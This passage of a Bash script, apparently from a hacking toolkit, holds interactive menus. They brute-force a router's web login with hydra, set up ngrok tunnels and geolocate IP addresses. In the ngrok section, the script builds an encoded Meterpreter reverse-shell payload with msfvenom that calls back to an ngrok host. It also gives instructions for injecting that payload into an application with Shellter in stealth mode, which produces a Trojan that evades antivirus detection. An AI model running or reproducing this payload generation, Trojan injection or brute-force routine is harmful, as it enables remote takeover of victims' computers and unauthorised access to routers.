'\\033]2;BRUTEFORCE LOGIN\\a'\n\tif [[ \"$BI\" = \"\" ]]\n\tthen\n\t\tTT=$(ifconfig | grep \"$WLANN\")\n\t\tif [[ \"$TT\" = \"\" ]]\n\t\tthen\n\t\t\tbin=0\n\t\t\tBI=\"\"$RS\"None\"$CE\"\"\n\t\telse\n\t\t\tbin=1\n\t\t\tBI=\"$WLANN\"\n\t\tfi\n\tfi\n\tif [[ \"$US\" = \"\" ]]\n\tthen\n\t\tUS=\"admin\"\n\tfi\n\tif [[ \"$WL\" = \"\" ]]\n\tthen\n\t\twls=0\n\t\tWL=\"\"$RS\"None\"$CE\"\"\n\tfi\n\tif [[ \"$RQ\" = \"\" ]]\n\tthen\n\t\trqq=0\n\t\tRQ=\"\"$RS\"None\"$CE\"\"\n\tfi\n\tif [[ \"$UP\" = \"\" ]]\n\tthen\n\t\tupp=0\n\t\tUP=\"\"$RS\"None\"$CE\"\"\n\tfi\n\tif [[ \"$IS\" = \"\" ]]\n\tthen\n\t\tiss=0\n\t\tIS=\"\"$RS\"None\"$CE\"\"\n\tfi\n\tif [[ \"$FM\" = \"\" ]]\n\tthen\n\t\tFM=\"http-post-form\"\n\tfi\n\t#~ echo -e \"\"$RS\"ONLY FOR LEGAL PURPOSES\"$CE\"\"\n\techo -e \"\"$YS\" 1\"$CE\") Select interface           Current:\"$YS\"\"$BI\"\"$CE\"\"\n\techo -e \"\"$YS\" 2\"$CE\") Set username               Current:\"$YS\"\"$US\"\"$CE\"\"\n\techo -e \"\"$YS\" 3\"$CE\") Select wordlist            Current:\"$YS\"\"$WL\"\"$CE\"\"\n\techo -e \"\"$YS\" 4\"$CE\") Request URI:               Current:\"$YS\"\"$RQ\"\"$CE\"\"\n\techo -e \"\"$YS\" 5\"$CE\") ^USER^ & ^PASS^ field      Current:\"$YS\"\"$UP\"\"$CE\"\"\n\techo -e \"\"$YS\" 6\"$CE\") Invalid pass string        Current:\"$YS\"\"$IS\"\"$CE\"\"\n\techo -e \"\"$YS\" 7\"$CE\") Form                       Current:\"$YS\"\"$FM\"\"$CE\"\"\n\techo -e \"\"$YS\" 8\"$CE\") Open router's login page in browser\"\n\techo -e \"\"$YS\" w\"$CE\") Open Wireshark\"\n\techo -e \"\"$YS\" s\"$CE\") Start bruteforcing\"\n\techo -e \"\"$YS\"bu\"$CE\") Burpsuite automated tool\"\n\techo -e \"\"$YS\" i\"$CE\") Info\"\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -n \"Choose: \"\n\tread BR\n\tclear\n\tif [[ \"$BR\" = \"b\" || \"$BR\" = 00 || \"$BR\" = \"back\" ]]\n\tthen\n\t\tBACKL=1\n\t\tbreak\n\telif [[ \"$BR\" = \"bu\" ]]\n\tthen\n\t\tburpsuite\n\telif [[ \"$BR\" = \"w\" ]]\n\tthen\n\t\twireshark & disown\n\telif [[ \"$BR\" = 0 ]]\n\tthen\n\t\texit\n\telif [[ \"$BR\" = \"i\" ]]\n\tthen\n\t\techo -e \"\"$LGYS\"With hydra you can bruteforce your router's login screen.\"\n\t\techo -e \"Select interface\"\n\t\techo -e \"\tYou need to select an interface so the script can get the gateway.\"\n\t\techo -e \"Set username\"\n\t\techo -e \"\tSet the username for the login screen.(e.g. admin)\"\n\t\techo -e \"Select wordlist\"\n\t\techo -e \"\tSelect a text file with a password on every line.\"\n\t\techo -e \"Request URI\"\n\t\techo -e \"\tYou will find this on Wireshark. Follow the video below for instructions.\"\n\t\techo -e \"\t(e.g. /login.php) or (e.g. /cgi-bin/login.exe) etc etc...\"\n\t\techo -e \"^USER^ & ^PASS^ field\"\n\t\techo -e \"\tYou will find this on Wireshark. Follow the video below for instructions.\"\n\t\techo -e \"\t(e.g. username=^USER^&password=^PASS^)\"\n\t\techo -e \"Invalid pass string\"\n\t\techo -e \"\tYou will find this when you try to login with the wrong pass on the login page.\"\n\t\techo -e \"\tYou need to set a word that is being printed on the screen when login fails.\"\n\t\techo -e \"\t(e.g. Invalid) or (e.g. Wrong) or (e.g. Please) etc etc...\"\n\t\techo -e \"\tFollow the video below for instructions.\"\n\t\techo -e \"Form\"\n\t\techo -e \"\t(e.g. http-get-form) or (e.g. http-post-form) etc etc...\"\n\t\techo -e \"\"\n\t\techo -e \"Video-demonstration: https://www.youtube.com/watch?v=vgbP0AQ5bt4\"\n\t\techo -e \"\"\n\t\techo -e \"\"$CE\"\"\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\telif [[ \"$BR\" = 1 ]]\n\tthen\n\t\tselect_interface\n\t\tif [[ \"$OUTPUT\" != \"\" && \"$OUTPUT\" != 0 ]]\n\t\tthen\n\t\t\tbin=1\n\t\t\tBI=\"$OUTPUT\"\n\t\telse\n\t\t\tbin=0\n\t\tfi\n\telif [[ \"$BR\" = 2 ]]\n\tthen\n\t\techo -n \"Username: \"\n\t\tread US\n\telif [[ \"$BR\" = 3 ]]\n\tthen\n\t\techo -n \"Wordlist: \"\n\t\tread WL\n\t\tif [[ ! -f \"$WL\" ]]\n\t\tthen\n\t\t\tWL=\"\"\n\t\t\techo -e \"\"$RS\"Couldn't find the wordlist\"$CE\"\"\n\t\t\twls=0\n\t\t\tsleep 2\n\t\telse\n\t\t\twls=1\n\t\tfi\n\telif [[ \"$BR\" = 4 ]]\n\tthen\n\t\techo -n \"Request URI: \"\n\t\tread RQ\n\t\trqq=1\n\telif [[ \"$BR\" = 5 ]]\n\tthen\n\t\techo -n \"^USER^ & ^PASS^ field: \"\n\t\tread UP\n\t\tupp=1\n\telif [[ \"$BR\" = 6 ]]\n\tthen\n\t\techo -n \"Invalid pass string: \"\n\t\tread IS\n\t\tiss=1\n\telif [[ \"$BR\" = 7 ]]\n\tthen\n\t\techo -n \"Form: \"\n\t\tread FM\n\telif [[ \"$BR\" = 8 ]]\n\tthen\n\t\tif [[ \"$bin\" != 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Please select an interface first\"$CE\"\"\n\t\t\tsleep 3\n\t\t\tcontinue\n\t\tfi\n\t\tTT=$(ifconfig | grep \"$BI\")\n\t\tif [[ \"$TT\" = \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"\"$BI\" is not available\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tBI=\"\"\n\t\t\tcontinue\n\t\tfi\n\t\techo -e \"\"$BS\"Searching gateway on \"$BI\"\"$CE\"...\"\n\t\tsleep 0.5\n\t\tGATE=$(find_gateways \"$BI\" interface)\n\t\tTTT=$(is_it_an_ip \"$GATE\")\n\t\tif [[ \"$TTT\" != 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Couldn't find your gateway.\"$CE\"\"\n\t\t\tsleep 2\n\t\t\techo -e \"\"$RS\"Make sure you are connected to a network\"$CE\"\"\n\t\t\tsleep 3\n\t\t\tcontinue\n\t\telse\n\t\t\techo -e \"\"$YS\"Gateway found: \"$GATE\"\"$CE\"\"\n\t\t\tsleep 1\n\t\tfi\n\t\tclear\n\t\tgio open \"http://\"$GATE\"\"\n\t\techo -e \"Your browser is going to open\"\n\t\tsleep 2\n\telif [[ \"$BR\" = \"s\" ]]\n\tthen\n\t\tif [[ \"$bin\" != 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Please select an interface first\"$CE\"\"\n\t\t\tsleep 3\n\t\t\tcontinue\n\t\tfi\n\t\tif [[ \"$wls\" != 1 ]] \n\t\tthen\n\t\t\techo -e \"\"$RS\"Set a wordlist first\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tcontinue\n\t\tfi\n\t\tTT=$(ifconfig | grep \"$BI\")\n\t\tif [[ \"$TT\" = \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"\"$BI\" is not available\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tBI=\"\"\n\t\t\tcontinue\n\t\tfi\n\t\tif [[ \"$rqq\" != 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Please set the Request URI\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tcontinue\n\t\tfi\n\t\tif [[ \"$iss\" != 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Please set the invalid pass string\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tcontinue\n\t\tfi\n\t\tif [[ \"$upp\" != 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Please set the ^USER^ & ^PASS^ field\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tcontinue\n\t\tfi\n\t\tif [[ \"$FM\" = \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Set the Form first\"$CE\"\"\n\t\t\tsleep 2\n\t\t\tcontinue\n\t\tfi\n\t\techo -e \"\"$BS\"Searching gateway on \"$BI\"\"$CE\"...\"\n\t\tsleep 1\n\t\tGATE=$(find_gateways \"$BI\" interface)\n\t\tTTT=$(is_it_an_ip \"$GATE\")\n\t\tif [[ \"$TTT\" != 1 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"Couldn't find your gateway.\"$CE\"\"\n\t\t\tsleep 2\n\t\t\techo -e \"\"$RS\"Make sure you are connected to a network\"$CE\"\"\n\t\t\tsleep 3\n\t\t\tcontinue\n\t\telse\n\t\t\techo -e \"\"$YS\"Gateway found: \"$GATE\"\"$CE\"\"\n\t\t\tsleep 2\n\t\tfi\n\t\tclear\n\t\techo -e \"\"$RS\"Do you have permission to bruteforce this network?\"$CE\"\"$YNONLY\"\"\n\t\tread PERM\n\t\tif [[ \"$PERM\" != \"y\" && \"$PERM\" != \"Y\" ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"You cannot proceed then\"$CE\"\"\n\t\t\tsleep 3\n\t\t\tcontinue\n\t\tfi\n\t\thydra -l \"$US\" -P \"$WL\" -e nsr -f -V \"$GATE\" \"$FM\" \"\"$RQ\":\"$UP\":\"$IS\"\"\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\tfi\ndone\n}\nfunction find_gateways()\n{\n\t#example: find_gateways wlan0 interface\n\tFG1=\"$1\"\n\tFG2=\"$2\"\n\tif [[ \"$FG1\" = \"\" ]]\n\tthen\n\t\techo -e \"\"$BS\"Gateways\"$CE\": \"\n\t\tn=0\n\t\tethr=$(ifconfig | grep \"$ETH\")\n\t\tif [[ \"$ethr\" != \"\" ]]\n\t\tthen\n\t\t\tethd=$(route -n | awk -v int1=\"$ETH\" '{if(int1~$8 && $2!=\"IP\" && $2!=\"0.0.0.0\"){print $2}}')\n\t\t\tchi=$(is_it_an_ip \"$ethd\")\n\t\t\tif [[ \"$ethd\" != \"\" && \"$chi\" = 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$ETH\" = \"$YS\"\"$ethd\"\"$CE\"\"\n\t\t\t\tn=1\n\t\t\tfi\n\t\tfi\n\t\twlanr=$(ifconfig | grep \"$WLANN\")\n\t\tif [[ \"$wlanr\" != \"\" ]]\n\t\tthen\n\t\t\twland=$(route -n | awk -v int1=\"$WLANN\" '{if(int1~$8 && $2!=\"IP\" && $2!=\"0.0.0.0\"){print $2}}')\n\t\t\tchi=$(is_it_an_ip \"$wland\")\n\t\t\tif [[ \"$wland\" != \"\" && \"$chi\" = 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$WLANN\" = \"$YS\"\"$wland\"\"$CE\"\"\n\t\t\t\tn=1\n\t\t\tfi\n\t\tfi\n\t\twlanmr=$(ifconfig | grep \"$WLANNM\")\n\t\tif [[ \"$wlanmr\" != \"\" ]]\n\t\tthen\n\t\t\twlanmd=$(route -n | awk -v int1=\"$WLANNM\" '{if(int1~$8 && $2!=\"IP\" && $2!=\"0.0.0.0\"){print $2}}')\n\t\t\tchi=$(is_it_an_ip \"$wlanmd\")\n\t\t\tif [[ \"$wlanmd\" != \"\" && \"$chi\" = 1 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$WLANNM\" = \"$YS\"\"$wlanmd\"\"$CE\"\"\n\t\t\t\tn=1\n\t\t\tfi\n\t\tfi\n\t\tif [[ \"$n\" = 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\"No known interfaces found available\"$CE\"\"\n\t\tfi\n\telse\n\t\tif [[ \"$FG2\" = \"interface\" ]]\n\t\tthen\n\t\t\tinttos=$(ifconfig | grep \"$FG1\")\n\t\t\tif [[ \"$inttos\" != \"\" ]]\n\t\t\tthen\n\t\t\t\tgate=$(route -n | awk -v int1=\"$FG1\" '{if(int1~$8 && $2!=\"IP\" && $2!=\"0.0.0.0\"){print $2}}')\n\t\t\t\tcho=$(is_it_an_ip \"$gate\")\n\t\t\t\tif [[ \"$cho\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\techo \"$gate\"\n\t\t\t\tfi\n\t\t\telse\n\t\t\t\techo 0\n\t\t\tfi\n\t\t#~ elif [[ \"$FG2\" = \"ip\" ]]\n\t\t#~ then\n\t\t\t#~ iptos=$(ifconfig | grep \"$FG1\")\n\t\t\t#~ if [[ \"$iptos\" != \"\" ]]\n\t\t\t#~ then\n\t\t\t\t#~ dot=$(give_ip_take_zero \"$FG1\" \"dot\")\n\t\t\t\t#~ gate=$(route -n | awk -v int1=\"$dot\" '{if(int1~$8 && $2!=\"IP\" && $2!=\"0.0.0.0\"){print $2}}')\n\t\t\t\t#~ echo \"$gate\"\n\t\t\t\t#~ cho=$(is_it_an_ip \"$gate\")\n\t\t\t\t#~ if [[ \"$cho\" = 1 ]]\n\t\t\t\t#~ then\n\t\t\t\t\t#~ echo \"$gate\"\n\t\t\t\t#~ fi\n\t\t\t#~ else\n\t\t\t\t#~ echo 0\n\t\t\t#~ fi\n\t\t#~ else\n\t\t\t#~ echo -e \"\"$RS\"Could not identify 2nd parameter\"$CE\"\"\n\t\t\t#~ sleep 4\n\t\tfi\t\t\n\tfi\n}\nfunction select_interface\n{\n\twhile true\n\tdo\n\t\tclear\n\t\tTERMINALTITLE=\"Select interface\"\n\t\tdash_calc\n\t\tprintf '\\033]2;SELECT INTERFACE\\a'\n\t\tTT=$(ifconfig | grep \"$WLANN:\")\n\t\tif [[ \"$TT\" != \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 1\"$CE\") \"$WLANN\"\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 1\"$CE\") \"$RS\"\"$WLANN\"\"$CE\"\"\n\t\tfi\n\t\tTT=$(ifconfig | grep \"$ETH:\")\n\t\tif [[ \"$TT\" != \"\" ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\" 2\"$CE\") \"$ETH\"\"\n\t\telse\n\t\t\techo -e \"\"$RS\" 2\"$CE\") \"$RS\"\"$ETH\"\"$CE\"\"\n\t\tfi\n\t\techo -e \"\"$YS\" 3\"$CE\") Manually type an interface\"\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\techo -e \"Choose: \"\n\t\tread CI\n\t\tif [[ \"$CI\" = 1 ]]\n\t\tthen\n\t\t\tTT=$(ifconfig | grep \"$WLANN:\")\n\t\t\tif [[ \"$TT\" != \"\" ]]\n\t\t\tthen\n\t\t\t\tSINT=\"$WLANN\"\n\t\t\t\tOUTPUT=\"$SINT\"\n\t\t\t\tinter=0\n\t\t\t\tbreak\n\t\t\telse\n\t\t\t\tinter=1\n\t\t\t\tOUTPUT=0\n\t\t\t\techo -e \"\"$RS\"Could not find this interface\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\tfi\n\t\telif [[ \"$CI\" = 2 ]]\n\t\tthen\n\t\t\tTT=$(ifconfig | grep \"$ETH:\")\n\t\t\tif [[ \"$TT\" != \"\" ]]\n\t\t\tthen\n\t\t\t\tSINT=\"$ETH\"\n\t\t\t\tOUTPUT=\"$SINT\"\n\t\t\t\tinter=0\n\t\t\t\tbreak\n\t\t\telse\n\t\t\t\tinter=1\n\t\t\t\tOUTPUT=0\n\t\t\t\techo -e \"\"$RS\"Could not find this interface\"$CE\"\"\n\t\t\t\tsleep 2\n\t\t\t\tcontinue\n\t\t\tfi\n\t\telif [[ \"$CI\" = 3 ]]\n\t\tthen\n\t\t\techo -e \"Interface to use: \"\n\t\t\tread ITU\n\t\t\tTT=$(ifconfig | grep \"$ITU:\")\n\t\t\tif [[ \"$TT\" != \"\" ]]\n\t\t\tthen\n\t\t\t\tSINT=\"$ITU\"\n\t\t\t\tOUTPUT=\"$SINT\"\n\t\t\t\tinter=0\n\t\t\t\tbreak\n\t\t\telse\n\t\t\t\techo -e \"\"$RS\"Could not find this interface\"$CE\"\"\n\t\t\t\techo -e \"Do you still want to use it?\"$YNNO\": \"\n\t\t\t\tread SU\n\t\t\t\tif [[ \"$SU\" = \"y\" ]]\n\t\t\t\tthen\n\t\t\t\t\tSINT=\"$ITU\"\n\t\t\t\t\tOUTPUT=\"$SINT\"\n\t\t\t\t\tinter=0\n\t\t\t\t\tbreak\n\t\t\t\telse\n\t\t\t\t\tOUTPUT=0\n\t\t\t\t\tcontinue\n\t\t\t\tfi\n\t\t\tfi\n\t\telif [[ \"$CI\" = \"b\" ]]\n\t\tthen\n\t\t\tclear\n\t\t\tbreak\n\t\tfi\n\tdone\n}\nfunction donate_option\n{\n\twhile true\n\tdo\n\tclear\n\tTERMINALTITLE=\"DONATION\"\n\tdash_calc\n\tprintf '\\033]2;DONATION\\a'\n\techo -e \"If you found my script useful, you can buy me a coffee :)\"\n\techo -e \"\"$LBS\"Total lscript donations:\"$CE\" $DONATIONS\"\n\techo -e \"\"$YS\" 1\"$CE\") Open browser to donate\"\n\techo -e \"\"$YS\" 2\"$CE\") Copy donation link\"\n\techo -e \"\"$YS\" b\"$CE\") I don't care about your work! :P\"\n\techo -e \"Choose: \"\n\tread DON\n\tif [[ \"$DON\" = \"1\" ]]\n\tthen\n\t\tgio open \"https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY\"\n\telif [[ \"$DON\" = \"2\" ]]\n\tthen\n\t\techo -e \"Donation link: https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=GC9RSY4CS6KAY\"\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\telif [[ \"$DON\" = \"back\" || \"$DON\" = \"b\" || \"$DON\" = \"00\" ]]\n\tthen\n\t\tBACKL=1\n\t\tbreak\n\telif [[ \"$DON\" = \"0\" ]]\n\tthen\n\t\tclear\n\t\texit\n\tfi\n\tdone\n}\nfunction ngrok_option\n{\n\twhile true\n\tdo\n\t\tclear\n\t\tif [[ -f /root/ngrok ]]\n\t\tthen\n\t\t\tTERMINALTITLE=\"NGROK\"\n\t\t\tdash_calc\n\t\t\tprintf '\\033]2;NGROK\\a'\n\t\t\techo -e \"\"$YS\"help\"$CE\") How to make it work?\"\n\t\t\techo -e \"\"$YS\" 1\"$CE\") Open a tcp port\"\n\t\t\techo -e \"\"$YS\" 2\"$CE\") Open a tls port\"\n\t\t\techo -e \"\"$YS\" 3\"$CE\") Open a http port\"\n\t\t\techo -e \"\"$YS\" 4\"$CE\") Intergrate with Shellter\"\n\t\t\techo -e \"\"$YS\" 5\"$CE\") Set your ngrok authtoken\"\n\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\techo -e \"Choose: \"\n\t\t\tread NG\n\t\t\tclear\n\t\t\tif [[ \"$NG\" = \"help\" || \"$NG\" = \"h\" ]]\n\t\t\tthen\n\t\t\t\techo -e \"With ngrok, you can port forward without router intergration.\"\n\t\t\t\techo -e \"It is free, HOWEVER:\"\n\t\t\t\techo -e \"---to open a tcp port, you need to sign up (it's too easy)\"\n\t\t\t\techo -e \"   Go to https://ngrok.com and choose \"$YS\"sign up\"$CE\".\"\n\t\t\t\techo -e \"   When that's done, copy the given \"$YS\"authtoken\"$CE\".\"\n\t\t\t\techo -e \"   (If you can't find it go to: https://dashboard.ngrok.com/auth )\"\n\t\t\t\techo -e \"   Then select the 'set your authtoken' option in lscript, and paste it.\"\n\t\t\t\techo -e \"---to make a reverse tcp payload:\"\n\t\t\t\techo -e \"   You need to set the payload to: windows/meterpreter/reverse_tcp_dns\"\n\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t$READAK\n\t\t\telif [[ \"$NG\" = 1 || \"$NG\" = 2 || \"$NG\" = 3 ]]\n\t\t\tthen\n\t\t\t\techo -e \"Type the local port to forward: \"\n\t\t\t\tread PORTL\n\t\t\t\tif [[ \"$NG\" = 1 ]]\n\t\t\t\tthen\n\t\t\t\t\tPROT=\"tcp\"\n\t\t\t\telif [[ \"$NG\" = 2 ]]\n\t\t\t\tthen\n\t\t\t\t\tPROT=\"tls\"\n\t\t\t\telse\n\t\t\t\t\tPROT=\"http\"\n\t\t\t\tfi\n\t\t\t\texport PORTL\n\t\t\t\texport PROT\n\t\t\t\txterm -geometry 85x15+9999+999999 -e bash -c './ngrok $PROT $PORTL; exec bash' & disown\n\t\t\telif [[ \"$NG\" = 4 ]]\n\t\t\tthen\n\t\t\t\twhile true\n\t\t\t\tdo\n\t\t\t\t\tclear\n\t\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Make a raw tcp payload for Shellter\"\n\t\t\t\t\techo -e \"\"$YS\" 2\"$CE\") How to intergrate it\"\n\t\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\t\techo -e \"Choose:\"\n\t\t\t\t\tread SHINT\n\t\t\t\t\tclear\n\t\t\t\t\tif [[ \"$SHINT\" = 1 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\twhile true\n\t\t\t\t\t\tdo\n\t\t\t\t\t\t\tif [[ \"$NGPORT\" = \"\" ]]\n\t\t\t\t\t\t\tthen\n\t\t\t\t\t\t\t\tNGPORT=\"\\e[1;31mNONE\\e[0m\"\n\t\t\t\t\t\t\tfi\n\t\t\t\t\t\t\tclear\n\t\t\t\t\t\t\techo -e \"\"$YS\" 1\"$CE\") Set the Ngrok tcp port              CURRENT:\"$NGPORT\"\"\n\t\t\t\t\t\t\t#~ echo -e \"\"$YS\" 2\"$CE\") Set your local tcp port             CURRENT:\"$LPORT\"\"\n\t\t\t\t\t\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t\t\t\t\t\techo -e \"\"$YS\"run\"$CE\") Make the payload\"\n\t\t\t\t\t\t\techo -e \"Choose: \"\n\t\t\t\t\t\t\tread RP\n\t\t\t\t\t\t\tif [[ \"$RP\" = 1 ]]\n\t\t\t\t\t\t\tthen\n\t\t\t\t\t\t\t\techo -e \"Ngrok port: \"\n\t\t\t\t\t\t\t\tread NGPORT\n\t\t\t\t\t\t\telif [[ \"$RP\" = \"back\" || \"$RP\" = \"b\" ]]\n\t\t\t\t\t\t\tthen\n\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t\telif [[ \"$RP\" = \"run\" ]]\n\t\t\t\t\t\t\tthen\n\t\t\t\t\t\t\t\tRAW=rawfud\n\t\t\t\t\t\t\t\tNUMB=1\n\t\t\t\t\t\t\t\twhile true\n\t\t\t\t\t\t\t\tdo\n\t\t\t\t\t\t\t\t\tRAWN=\"\"$RAW\"\"$NUMB\"\"\n\t\t\t\t\t\t\t\t\tif [[ -f /root/Desktop/\"$RAWN\".raw ]]\n\t\t\t\t\t\t\t\t\tthen\n\t\t\t\t\t\t\t\t\t\tNUMB=$((NUMB+1))\n\t\t\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t\t\t\tfi\n\t\t\t\t\t\t\t\tdone\n\t\t\t\t\t\t\t\tmsfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=0.tcp.ngrok.io LPORT=$NGPORT -e x86/shikata_ga_nai -i 15 -f raw -o /root/Desktop/\"$RAWN\".raw\n\t\t\t\t\t\t\t\tsleep 2\n\t\t\t\t\t\t\t\tif [[ -f /root/Desktop/\"$RAWN\".raw ]]\n\t\t\t\t\t\t\t\tthen\n\t\t\t\t\t\t\t\t\tclear\n\t\t\t\t\t\t\t\t\techo -e \"Payload was saved to /root/Desktop/\"$RAWN\".raw\"\n\t\t\t\t\t\t\t\tfi\n\t\t\t\t\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t\t\t\t\t$READAK\n\t\t\t\t\t\t\tfi\n\t\t\t\t\t\tdone\n\t\t\t\t\telif [[ \"$SHINT\" = 2 ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\techo -e \"First you should make a raw payload with option 1.\"\n\t\t\t\t\t\techo -e \"Then open shellter and select your app to be injected.\"\n\t\t\t\t\t\techo -e \"Then, on stealth mode select y.\"\n\t\t\t\t\t\techo -e \"Select to type a custom payload, NOT listed.\"\n\t\t\t\t\t\techo -e \"Then type the path of the payload you have created on option 1.\"\n\t\t\t\t\t\techo -e \"For the listener, the payload is windows/meterpreter/reverse_tcp_dns\"\n\t\t\t\t\t\techo -e \"LHOST is 127.0.0.1 and LPORT is the port you opened to ngrok.\"\n\t\t\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t\t\t$READAK\n\t\t\t\t\telif [[ \"$SHINT\" = \"back\" || \"$SHINT\" = \"b\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\tbreak\n\t\t\t\t\tfi\n\t\t\t\tdone\n\t\t\telif [[ \"$NG\" = \"back\" || \"$NG\" = \"b\" || \"$NG\" = \"00\" ]]\n\t\t\tthen\n\t\t\t\tclear\n\t\t\t\tbreak\n\t\t\telif [[ \"$NG\" = 0 ]]\n\t\t\tthen\n\t\t\t\tclear\n\t\t\t\texit\n\t\t\telif [[ \"$NG\" = 5 ]]\n\t\t\tthen\n\t\t\t\t\techo -e \"Type your authtoken: \"\n\t\t\t\t\tread AUTHT\n\t\t\t\t\tif [[ \"$AUTHT\" != \"\" ]]\n\t\t\t\t\tthen\n\t\t\t\t\t\t./ngrok authtoken $AUTHT\n\t\t\t\t\t\techo -e \"$PAKTGB\"\n\t\t\t\t\t\t$READAK\n\t\t\t\t\tfi\n\t\t\tfi\n\t\telse\n\t\t\techo -e \"\"$RS\"Ngrok is not installed.type '\"$CE\"\"$YS\"install\"$CE\"\"$RS\"' to install it.\"\n\t\t\tread INSTALL\n\t\t\tif [[ \"$INSTALL\" = \"install\" ]]\n\t\t\tthen\n\t\t\t\tinstall_ngrok\n\t\t\tfi\n\t\tfi\n\tdone\n}\nfunction geolocate_ip()\n{\n\tlocbool=1\n\techo -e \"\"$BS\"Please wait...\"$CE\"\"\n\tA1=\"$1\"\n\tAA1=$(is_it_an_ip \"$A1\")\n\tif [[ \"$AA1\" = 1 ]]\n\tthen\n\t\tcountry=$(curl ipinfo.io/\"$A1\"/country 2>/dev/null)\n\t\tif [[ \"$country\" = \"\" ]]\n\t\tthen\n\t\t\tcountry=\"\"$RS\"Not found\"$CE\"\"\n\t\tfi\n\t\tloc=$(curl ipinfo.io/\"$A1\"/loc 2>/dev/null)\n\t\tif [[ \"$loc\" = \"\" ]]\n\t\tthen\n\t\t\tlocbool=0\n\t\t\tloc=\"\"$RS\"Not found\"$CE\"\"\n\t\tfi\n\t\tcity=$(curl ipinfo.io/\"$A1\"/city 2>/dev/null)\n\t\tif [[ \"$city\" = \"\" ]]\n\t\tthen\n\t\t\tcity=\"\"$RS\"Not found\"$CE\"\"\n\t\tfi\n\t\torg=$(curl ipinfo.io/\"$A1\"/org 2>/dev/null)\n\t\tif [[ \"$org\" = \"\" ]]\n\t\tthen\n\t\t\torg=\"\"$RS\"Not found\"$CE\"\"\n\t\tfi\n\t\tpostal=$(curl ipinfo.io/\"$A1\"/postal 2>/dev/null)\n\t\tif [[ \"$postal\" = \"\" ]]\n\t\tthen\n\t\t\tpostal=\"\"$RS\"Not found\"$CE\"\"\n\t\tfi\n\t\tregion=$(curl ipinfo.io/\"$A1\"/region 2>/dev/null)\n\t\tif [[ \"$region\" = \"\" ]]\n\t\tthen\n\t\t\tregion=\"\"$RS\"Not found\"$CE\"\"\n\t\tfi\n\t\thostname=$(curl ipinfo.io/\"$A1\"/hostname 2>/dev/null)\n\t\tif [[ \"$hostname\" = \"\" ]]\n\t\tthen\n\t\t\thostname=\"\"$RS\"Not found\"$CE\"\"\n\t\tfi\n\t\techo -e \"     Country: $country\"\n\t\techo -e \"      Region: $region\"\n\t\techo -e \"    Location: $loc\"\n\t\techo -e \"        City: $city\"\n\t\techo -e \"      Postal: $postal\"\n\t\techo -e \"    Hostname: $hostname\"\n\t\techo -e \"Organization: $org\"\n\t\tif [[ \"$locbool\" = 0 ]]\n\t\tthen\n\t\t\techo -e \"\"$RS\" m\"$CE\") Open google maps location\"\n\t\telse\n\t\t\techo -e \"\"$YS\" m\"$CE\") Open google maps location\"\n\t\tfi\n\t\techo -e \"\"$YS\" *\"$CE\") Go back\"\n\t\techo -e \"Choose: \"\n\t\tread ge\n\t\tif [[ \"$ge\" = \"m\" ]]\n\t\tthen\n\t\t\tif [[ \"$locbool\" = 0 ]]\n\t\t\tthen\n\t\t\t\techo -e \"\"$RS\"Location was not found\"$CE\"\"\n\t\t\t\tsleep 3\n\t\t\telse\n\t\t\t\tgio open https://www.google.gr/maps/search/\"$loc\"/\n\t\t\tfi\n\t\telse\n\t\t\tclear\n\t\t\tBACKL=1\n\t\tfi\n\telse\n\t\techo 0\n\tfi\n}\nfunction ip_scan()\n{\n\t\nwhile true\ndo\n\t#passing interface\n\tIPF=$1\n\t#passing mode if any  (1=choosable   2=only rescanable)\n\t#Mode 1 is for choosing and returning the IP.\n\t#Mode 2 is for echoing the scan, not choosing.\n\tMODE=$2\n\texport IPF\n\tif [[ \"$IPF\" = \"\" ]]\n\tthen\n\t\techo -e \"\"$RS\"Error 6. No parameters passed\"$CE\"\"\n\t\tsleep 3\n\t\tbreak\n\tfi\n\t#getting local 